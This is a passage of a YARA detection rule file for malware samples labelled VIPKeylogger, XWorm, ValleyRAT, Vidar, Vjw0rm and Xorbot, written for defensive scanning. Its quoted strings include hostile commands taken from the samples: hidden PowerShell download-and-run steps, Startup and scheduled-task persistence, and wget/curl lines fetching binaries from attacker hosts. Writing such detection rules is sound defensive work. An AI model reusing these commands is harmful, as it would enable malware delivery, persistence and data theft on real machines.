      description = "_subset_batch - file VIPKeylogger(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_a1443ce2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a1443ce2d09567434662a381c51bc50f3dc5bde281da8214713ba1c3dd17bfed"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s3 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s4 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s5 = "naalene forbehandlede.exe" fullword wide /* score: '19.00'*/
      $s6 = "nstall System v3.02.1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s7 = "oker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compati" ascii /* score: '10.00'*/
      $s8 = "mobilisnwr bingoers" fullword wide /* score: '9.00'*/
      $s9 = "gawks datatransporter" fullword wide /* score: '9.00'*/
      $s10 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__b34f154ec913d2d2c435cbd644e91687_imphash__c138eb32 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_c138eb32.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c138eb32a0d4ade14eca1c5d68391ea06addbe969593b68470bd593539053b01"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s3 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s4 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s5 = "naalene forbehandlede.exe" fullword wide /* score: '19.00'*/
      $s6 = "nstall System v3.02.1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s7 = "oker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compati" ascii /* score: '10.00'*/
      $s8 = "mobilisnwr bingoers" fullword wide /* score: '9.00'*/
      $s9 = "gawks datatransporter" fullword wide /* score: '9.00'*/
      $s10 = "+ /uNL" fullword ascii /* score: '9.00'*/
      $s11 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__b34f154ec913d2d2c435cbd644e91687_imphash__efa62fe7 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_efa62fe7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "efa62fe7ffe80b10a2a249caeec48bcd141109b59023f20f051e7f2042b2fba5"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s3 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s4 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s5 = "naalene forbehandlede.exe" fullword wide /* score: '19.00'*/
      $s6 = "nstall System v3.02.1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s7 = "oker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compati" ascii /* score: '10.00'*/
      $s8 = "mobilisnwr bingoers" fullword wide /* score: '9.00'*/
      $s9 = "gawks datatransporter" fullword wide /* score: '9.00'*/
      $s10 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
      $s11 = "stalest" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule XWorm_signature__121bd4dd {
   meta:
      description = "_subset_batch - file XWorm(signature)_121bd4dd.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "121bd4dd983fa1b5e88d9d5be06d0cc4bd3db22a59c469225e1bc67d42585784"
   strings:
      $x1 = "start \"\" /B %POWERSHELL% -WindowStyle Hidden -ExecutionPolicy Bypass -File \"C:\\Users\\Public\\stem.ps1\"" fullword ascii /* score: '58.00'*/
      $x2 = "move /Y \"%EXTRACT_PATH%\\lo.txt\" \"C:\\Users\\Public\\lo.txt\" >nul 2>&1" fullword ascii /* score: '39.00'*/
      $x3 = "move /Y \"%EXTRACT_PATH%\\stem.ps1\" \"C:\\Users\\Public\\stem.ps1\" >nul 2>&1" fullword ascii /* score: '36.00'*/
      $x4 = "move /Y \"%EXTRACT_PATH%\\CacheIco.txt\" \"C:\\Users\\Public\\CacheIco.txt\" >nul 2>&1" fullword ascii /* score: '35.00'*/
      $x5 = "set \"DOWNLOAD_PATH=%TEMP%\\test_payload.zip\"" fullword ascii /* score: '33.00'*/
      $x6 = "attrib +s +h \"C:\\Users\\Public\\lo.txt\"" fullword ascii /* score: '31.00'*/
      $s7 = "%POWERSHELL% -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%DOWNLOAD_PATH%'\"" fullword ascii /* score: '29.00'*/
      $s8 = "%POWERSHELL% -WindowStyle Hidden -Command \"Expand-Archive -Path '%DOWNLOAD_PATH%' -DestinationPath '%EXTRACT_PATH%' -Force\"" fullword ascii /* score: '29.00'*/
      $s9 = "attrib +s +h \"C:\\Users\\Public\\stem.ps1\"" fullword ascii /* score: '28.00'*/
      $s10 = "attrib +s +h \"C:\\Users\\Public\\CacheIco.txt\"" fullword ascii /* score: '27.00'*/
      $s11 = "set \"POWERSHELL=%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" fullword ascii /* score: '25.00'*/
      $s12 = "set \"EXTRACT_PATH=%TEMP%\\test_payload\"" fullword ascii /* score: '24.00'*/
      $s13 = "del /f /q \"%DOWNLOAD_PATH%\" >nul 2>&1" fullword ascii /* score: '22.00'*/
      $s14 = "rmdir /s /q \"%EXTRACT_PATH%\" >nul 2>&1" fullword ascii /* score: '16.00'*/
      $s15 = "set \"ZIP_URL=https://winsupport.lol/file/kwinnovation.zip\"" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 3KB and
      1 of ($x*) and all of them
}

rule XWorm_signature__75877670 {
   meta:
      description = "_subset_batch - file XWorm(signature)_75877670.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "758776705a4c14cbee9c515c1bc2ba3b99a8bceaa306bcd275c713fdd18d3603"
   strings:
      $x1 = "yWqvWGMpHVAepVMWZITLX2uYdWGd+pepzjHfCIWUe@fxk25TaYG7v@xNrmnSCX@sg+cxi6YI8WtH6pd0nDyGkQc@P2ECCwURMfDvJ0QOjRtKF8l3Q50cKqBHZ8yvJ5vs" ascii /* score: '44.00'*/
      $s2 = "%yiCMBVKBbH%%YoIGBjXlce%%FWntqwkXTZ%%UMtMHPFlwc%%gpiErxbaTc%%efwhACVjwe%%LNHcNlUVYM%%EMPaXqOIcT%%vjeRUPpmmf%%TvPrrtHfRf%%Cfbgxsq" ascii /* score: '20.00'*/
      $s3 = "eXNK2rRcf4CSkE36nppjQbJlN73+HZnIkBLXVrI4eiZPW9LES1buWZxNsI5eKBcJeUbFKSmb4WvH6dRUNvTJfRcMXGP4PSryqrw6lXPr4TqrfXYDH3zpdbXeYtoOHT0W" ascii /* score: '14.00'*/
      $s4 = "!WNlDJiMsJynjScnKmmVw! \"jtzDjcpBCZ=.Com\"" fullword ascii /* score: '14.00'*/
      $s5 = "xcBPRcDVioSD3WeR0zWg9DpjxixexOpIGfJ93ibOjqbVOOqvcmdJIpnmIjsydLCvareBcTn9wgNsQ+mwSmy604ZMs4YmB3M8y1f6VS99H51IpcnZPbpvaycJSlc7GyqS" ascii /* score: '14.00'*/
      $s6 = "!WNlDJiMsJynjScnKmmVw! \"kFtPjqGhSP=6] -\"" fullword ascii /* score: '13.00'*/
      $s7 = "%mLjSxucHAO%%cREKZPHOqO%%aIEPnskxnK%%FMkxRjcTSb%%gSALlIbqND%%ztZhmDhtEe%%kFtPjqGhSP%%NOVpHhiTEF%%qTJKllMclo%%bJoNQBzKBU%%bUxYQLx" ascii /* score: '13.00'*/
      $s8 = "pWg%%bFYjGrsnzp%%qqKGFruSRm%%EOgkFJBUsc%%mYPAqTXgVR%%UOPPlWKqID%%UjxKCmyNEW%%QxUwdrBjqM%%tnXarPYqZJ%%YkmPhdAeYe%%vkCYaxUtMT%%uBa" ascii /* score: '13.00'*/
      $s9 = "%HifhHSFrTh%%DyLfWNlpaZ%%sWqkMGxPDa%%ObdoEOndTc%%uaClGpNVcf%%ITHhFLRVva%%uPOStBuxBh%%zhwYFrteDw%%TCMxsVtWIT%%WsISHEmJRe%%VpuVFAx" ascii /* score: '13.00'*/
      $s10 = "!WNlDJiMsJynjScnKmmVw! \"xEVYGvgmSk= -w \"" fullword ascii /* score: '12.00'*/
      $s11 = "!WNlDJiMsJynjScnKmmVw! \"VofIapVFgq=exec\"" fullword ascii /* score: '12.00'*/
      $s12 = "UsWBfcJnwVs4RYXMgDqrU23EEYWj3j1swH+jzT35LbggHnWPOeiCMRTgBHob9lcsbiYzWqsRDyFEpZqXn0yd53beWO0X81dWT0UBT74VoybNOy3D3xk5qiVlo0T3DkTb" ascii /* score: '11.00'*/
      $s13 = "o6ygYtB4KzGKgfP+WmNZsDBIEnGpuuybXfwYNKFiSkx6wN3iFTJGLzmnlY8LIrbYqdR02t9oW3gjUbigI7OgOm7EjpElBTioZ1uaP2DhwWYIL4ufKcyZSrs8Lx1Voat7" ascii /* score: '11.00'*/
      $s14 = "PI7GwQfRuts4TQxcDch4WnVLihJex2PvJtfqRaRa4P0LW0N+KwbX49tu8GcFN2CWwxFQuBtS05ye+QCkdCdUS1M0pxYPxr1YY1WOD+WoIsSsdH8g0hDracp2eik2CUMg" ascii /* score: '11.00'*/
      $s15 = "iiCJgCebxPjgSx418fRn7QRCJUBEmjwvuP3P5fzOlaMJ28frDMu6pZofhIZ8DCm+9OM4NJDy7r71ItzgasuYaVN4XUVQCI4cMggMbOTzE1YRESiULXIEr0Wa9JIphFYg" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__edd641a5 {
   meta:
      description = "_subset_batch - file XWorm(signature)_edd641a5.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "edd641a5a00e3416f441f05c76f6a6f48df9276f8c842ca49f43b70eee9939d6"
   strings:
      $x1 = "NmTVQcMfOMODYmkXJbRvbNJMtrpfBWQympaVrRVy+nsGsgDRF3RfWpt2HsschwMHxnalI6h4Wj#LYGuHfGpw+8fhihfck2ZFCvDIoLvEsp+D0@#72ILXn2D18E2Ej8GD" ascii /* score: '46.00'*/
      $s2 = "%xUpqantYWx%%EBbUeDBaRP%%rlFesTjOuZ%%PYYaERhPtI%%iakayVsIEe%%QvYyWmpkYh%%dEEXIFDaqn%%vLGjGrbFGw%%BAkpiuZzds%%BXQmEDwmrS%%rrsqIfO" ascii /* score: '22.00'*/
      $s3 = "qggPk66uvU746cex6RdZOdwRYGBpidElJ+FZYn1GJfyTsEJmZuhIyzqaSw+QPLogt9kDb6voWmYMkQCbBj730+m6nU5ljx9ELuQiyG2ZOzP43BZxLEWITMoQ6aq84FZE" ascii /* score: '16.00'*/
      $s4 = "CXEGpi2IRcp2jO0MDWgtFnL0b9Da8qCxfZBuZQ++YfrfooUmQgpRYbxYzuI2kgFON9RUP0CUoJ3pYo59yqQoIv7DqY3bg+5#@yGsEtOlguImEXnFWUYoD4zNO4LMVZE2" ascii /* score: '14.00'*/
      $s5 = "!SUsQkhLZUkMSpaBUUpmX! \"AlDgJWxmHD=.Com\"" fullword ascii /* score: '14.00'*/
      $s6 = "MEtLogp+4MkaJvvHSjGji3U6Rz#sh2HD4IeyeywFUvQUKhe#UJ8mHPVpYaytbM7JE9bro5NsItFG+KCSVWrw85DvP1GXbXqFExY6DkxVYTQDWna#@LU6KWDpviFkaJ6j" ascii /* score: '14.00'*/
      $s7 = "%jMbimbmKEz%%oMoJTKkfDe%%gbsMgybAeO%%jNApwQDggh%%MWsQcgKDaG%%SXzUfhupcN%%aLGPqBlYnc%%heYvskJBKZ%%OxAxVloGko%%vodsgapDAB%%VLqXzOZ" ascii /* score: '13.00'*/
      $s8 = "KdEGIVY%%fmqHGIllSy%%xCLdyEPDWj%%mEOLYThEso%%DqYOGjljDX%%yoTWrpkBmz%%OdLLLAxFIM%%AHSDUhEWxp%%tGZYLYKStJ%%JGrTAAEmcf%%LGAQxQvqck%" ascii /* score: '13.00'*/
      $s9 = "!SUsQkhLZUkMSpaBUUpmX! \"FaUnqOYvWY= -w \"" fullword ascii /* score: '12.00'*/
      $s10 = "#CmPvvete8fZKVs6qdBexECPPLWb0whBnudacY5fgYDTpy38MXRjmdl9uks2biq8ZTTLMVhOLMCEQG0Q0vRy02MyLZIBXmnXovxqjfracwPvQ8u+rfXjO9clwwOaDlZL" ascii /* score: '12.00'*/
      $s11 = "!SUsQkhLZUkMSpaBUUpmX! \"sOlGZdNpgo=exec\"" fullword ascii /* score: '12.00'*/
      $s12 = "0rtNpKkPKubCbDu00qwHidr5koSSoEp37JkKQOZb5b2dLweDXLtigmwsgSgbpFJ4yL+h7lK7xcDn7XkM7uVYzq7bUXrrG13QWEtD1l7479dgeIfZvmT37TFkw7C0p1wp" ascii /* score: '11.00'*/
      $s13 = "7ggzLxmVmNxSZw6WfQH90H10hfVR9RhU+UJiGbzx+cPVsjgXJ0OsOiNpkoI9TFEnXYmlQeqfhrv7kB7LMyx6VDBwZncv8Tgy19uTeJeDjZ19DQ8o96eac8QncG7zOkb7" ascii /* score: '11.00'*/
      $s14 = "fay%%DxLZaAHiBL%%mIaiOOxLse%%cEwmeGoBDJ%%kPgXWLdEoW%%QNhJYRZcpi%%evNVvYbyUt%%mfESAxCcmd%%KSxvopxNon%%HmmuEObkCY%%KFKUKKipiA%%oWQ" ascii /* score: '11.00'*/
      $s15 = "ja8mmRPIcTSTPpXrV1DBiHkb1li8Nqio2UU4QpYhjIukuBW1JRTYw6QjnrFz4OnnWXb8tSatSeuqBRLoIF+Pr+g+ElXt+lev8t0cV84x3uyLax1bGp16vww6xer9qfqc" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__f39ac81b {
   meta:
      description = "_subset_batch - file XWorm(signature)_f39ac81b.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f39ac81b3c1b826c9cda0bfb63504e5c216987f2dec484498c3936250100f1f0"
   strings:
      $x1 = "powershell -nologo -noprofile -command \"$w=New-Object Net.WebClient;$w.DownloadFile('%u%/start.bat','%s%')\"" fullword ascii /* score: '44.00'*/
      $x2 = "    powershell -nologo -noprofile -command \"$w=New-Object Net.WebClient;$w.DownloadFile('%u%/a.txt','%TEMP%\\a.txt')\"" fullword ascii /* score: '40.00'*/
      $x3 = "    powershell -nologo -noprofile -command \"$w=New-Object Net.WebClient;$w.DownloadFile('%u%/b.txt','%TEMP%\\b.txt')\"" fullword ascii /* score: '40.00'*/
      $x4 = "powershell -nologo -noprofile -command \"$w=New-Object Net.WebClient;$w.DownloadFile('%u%/flip.zip','%z%')\"" fullword ascii /* score: '37.00'*/
      $x5 = "powershell -nologo -noprofile -command \"Expand-Archive -LiteralPath '%z%' -DestinationPath '%d%' -Force\"" fullword ascii /* score: '37.00'*/
      $s6 = "    powershell -windowstyle hidden -command \"Start-Process '%~f0' -ArgumentList 'h' -WindowStyle Hidden\"" fullword ascii /* score: '28.00'*/
      $s7 = "set \"s=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\start.bat\"" fullword ascii /* score: '25.00'*/
      $s8 = "python.exe sh.py -i vot.bin -k x.txt" fullword ascii /* score: '25.00'*/
      $s9 = "set \"u=https://wrote-kernel-extend-designation.trycloudflare.com\"" fullword ascii /* score: '22.00'*/
      $s10 = "set \"z=%TEMP%\\rop.zip\"" fullword ascii /* score: '18.00'*/
      $s11 = "cd /d \"%d%\"" fullword ascii /* score: '16.00'*/
      $s12 = "set \"d=%USERPROFILE%\\Contacts\\rop\"" fullword ascii /* score: '14.00'*/
      $s13 = "if %errorlevel%==0 (" fullword ascii /* score: '11.00'*/
      $s14 = "    start \"\" \"https://reports.weforum.org/docs/WEF_Global_Risks_Report_2025.pdf\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 3KB and
      1 of ($x*) and all of them
}

rule ValleyRAT_signature__c1201007f24fe8ef3e37fc185993eed2_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_c1201007f24fe8ef3e37fc185993eed2(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4770597491c90a78bb6915362e19c5feb822ef0386f35cbddf37dd9673bf1396"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\"/>" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule Vidar_signature__2eabe9054cad5152567f0699947a2c5b_imphash_ {
   meta:
      description = "_subset_batch - file Vidar(signature)_2eabe9054cad5152567f0699947a2c5b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6b42326c8c8e747d00504e9072e9e742f53c9861d0d377a6b8f6e412c3518725"
   strings:
      $s1 = "wlszgocx" fullword ascii /* score: '8.00'*/
      $s2 = "defghijk" fullword ascii /* score: '8.00'*/
      $s3 = "hudiqfrm" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule Vidar_signature__2eabe9054cad5152567f0699947a2c5b_imphash__5af82258 {
   meta:
      description = "_subset_batch - file Vidar(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_5af82258.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5af82258580c31c399b5c36af37ee4b37aed3cab62ddd9146c33493b38e25a4e"
   strings:
      $s1 = "* _v9B!" fullword ascii /* score: '9.00'*/
      $s2 = "/)&|2$ B!" fullword ascii /* score: '9.00'*/ /* hex encoded string '+' */
      $s3 = "bcdefghi" fullword ascii /* score: '8.00'*/
      $s4 = "rstuvwxy" fullword ascii /* score: '8.00'*/
      $s5 = "imkcbdlh" fullword ascii /* score: '8.00'*/
      $s6 = "RTemP{" fullword ascii /* score: '8.00'*/
      $s7 = "pdmnhiim" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule Vidar_signature__2eabe9054cad5152567f0699947a2c5b_imphash__63d70551 {
   meta:
      description = "_subset_batch - file Vidar(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_63d70551.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "63d70551a7e2ba9803837fdb397ace5f719e18963eb3bf7af3cba5f163567f32"
   strings:
      $s1 = "defghijk" fullword ascii /* score: '8.00'*/
      $s2 = "xeuhlbce" fullword ascii /* score: '8.00'*/
      $s3 = "ccemyciy" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule Vidar_signature__2eabe9054cad5152567f0699947a2c5b_imphash__242507e1 {
   meta:
      description = "_subset_batch - file Vidar(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_242507e1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "242507e13d2c7b486de8c841966b8cea3330b8452d4b0a75e4ebb045dccd7441"
   strings:
      $s1 = "#%D%s,/p" fullword ascii /* score: '10.50'*/
      $s2 = "# /zo+" fullword ascii /* score: '9.00'*/
      $s3 = "upualjpy" fullword ascii /* score: '8.00'*/
      $s4 = "bcdefghi" fullword ascii /* score: '8.00'*/
      $s5 = "qojklyxl" fullword ascii /* score: '8.00'*/
      $s6 = "rstuvwxy" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule Vidar_signature__2eabe9054cad5152567f0699947a2c5b_imphash__2e31a3bd {
   meta:
      description = "_subset_batch - file Vidar(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_2e31a3bd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2e31a3bd9a2582c855c34f5f127a84cb7faab6f030dd9e17c5cb14df0ca8abce"
   strings:
      $s1 = ".1 - X" fullword ascii /* score: '9.00'*/
      $s2 = "* JL)1" fullword ascii /* score: '9.00'*/
      $s3 = "bcdefghi" fullword ascii /* score: '8.00'*/
      $s4 = "rstuvwxy" fullword ascii /* score: '8.00'*/
      $s5 = "fbpzlfgx" fullword ascii /* score: '8.00'*/
      $s6 = "iuyonpgu" fullword ascii /* score: '8.00'*/
      $s7 = "WlcK -Pz" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule VIPKeylogger_signature__4 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature).lzh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e3592c325eec4f0580c6e82dc8ceb67c26bfb1b70b6f74059328f96d3e1e8279"
   strings:
      $s1 = "RFQ INQUIRY #SEP09152025.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x1d32 and filesize < 3000KB and
      all of them
}

rule VIPKeylogger_signature__5 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "76437d552cd5f46597283901cf93bfaf45f0dc93ad14ed27ed3b79603a120bae"
   strings:
      $s1 = "IOrdine cliente Landoil Technology S.r.l_250004063_20250904_104954.pdf.exe" fullword ascii /* score: '24.00'*/
      $s2 = "-I0/%D%" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule VIPKeylogger_signature__f4639a0b3116c2cfc71144b88a929cfd_imphash__e6cddaa9 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_f4639a0b3116c2cfc71144b88a929cfd(imphash)_e6cddaa9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e6cddaa90f34e86f420cc29ab96b1ea12913dde07cc9fb3783092c8763f10d45"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s3 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s4 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s5 = "udsvejfer korporativisme.exe" fullword wide /* score: '19.00'*/
      $s6 = "22222222222222222222222222222222222222222222222222" ascii /* score: '17.00'*/ /* hex encoded string '"""""""""""""""""""""""""' */
      $s7 = "nstall System v3.10</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s8 = "~nsu%X.tmp" fullword wide /* score: '11.00'*/
      $s9 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s10 = "5?c/^,\\|" fullword ascii /* score: '9.00'*/ /* hex encoded string '\' */
      $s11 = "* eu42" fullword ascii /* score: '9.00'*/
      $s12 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule Vjw_rm_signature_ {
   meta:
      description = "_subset_batch - file Vjw-rm(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2eefc51003525d6c370e59ab5c4e8b5014c06deca9570fb0cfa17d57375cc133"
   strings:
      $x1 = "shr.TargetPath = \"cmd.exe\";" fullword ascii /* score: '38.00'*/
      $x2 = "sr.TargetPath  = \"cmd.exe\";" fullword ascii /* score: '35.00'*/
      $s3 = "X.SetRequestHeader(\"User-Agent:\",nf());" fullword ascii /* score: '23.00'*/
      $s4 = "// Coded by v_B01 | Sliemerez -> Twitter : Sliemerez" fullword ascii /* score: '22.00'*/
      $s5 = "sh.run(\"Schtasks /create /sc minute /mo 30 /tn Skype /tr \\\"\" + dr,false);" fullword ascii /* score: '21.00'*/
      $s6 = "sh.run(\"wscript.exe //B \\\"\" + s2 + \"\\\"\",6);" fullword ascii /* score: '21.00'*/
      $s7 = "X.open('POST','http://127.0.0.1:1337/' + C, false);" fullword ascii /* score: '21.00'*/
      $s8 = "sh.run(\"wscript.exe //B \\\"\" + fu + \"\\\"\");" fullword ascii /* score: '21.00'*/
      $s9 = "var y = [\"winmgmts:\",\"win32_logicaldisk\",\"Win32_OperatingSystem\",'AntiVirusProduct'];" fullword ascii /* score: '19.00'*/
      $s10 = "if (fs.fileexists(Ex(\"Windir\") + \"\\\\Microsoft.NET\\\\Framework\\\\v2.0.50727\\\\vbc.exe\")) {" fullword ascii /* score: '18.00'*/
      $s11 = "var VN = \"Vjw0rm Cracked By Microsoft (microsoft.com)\" + \"_\" + Ob(6);" fullword ascii /* score: '18.00'*/
      $s12 = "var wmg = \"winmgmts:\\\\\\\\localhost\\\\root\\\\securitycenter\";" fullword ascii /* score: '17.00'*/
      $s13 = "var sr = sh.CreateShortCut(dp + gf.name + \".lnk\");" fullword ascii /* score: '15.00'*/
      $s14 = "var vdr = Ex(\"Temp\") + Ch + wn;" fullword ascii /* score: '15.00'*/
      $s15 = "var s2 = Ex(\"temp\") + \"\\\\\" + P[2];" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x2f2f and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule Xorbot_signature_ {
   meta:
      description = "_subset_batch - file Xorbot(signature).sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a162fecce63df7003fb3c3fe3e6acdfd0f93903750fd8b0a70ef1369b3bbfd12"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/c2xCigpEc8gDaRVh7EZSlV0MI6fxccCwu0; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/9E6NXF9JmaIxL3mH8JRePiGwSVynBZ7D3H; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/UklNdoJEqefKbj0omXK2A2NA7HPr2t9mHt; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/NvP4yWpIyGHBpJpLNVxqNqv2WmmgJhbeMk; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/rOT8MrVQpQ9puSolWPM9r3kE65VRwmIzB4; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/vY6FUiaS8kXewuaKLGmCF9frWmqkf9c8V7; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/120wAer7idhbNFA62mjwfieSsa9mYpDHDh; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/E4GzSXksWA4g9hmBARDi40XIL1gGPZbw59; curl -" ascii /* score: '30.00'*/
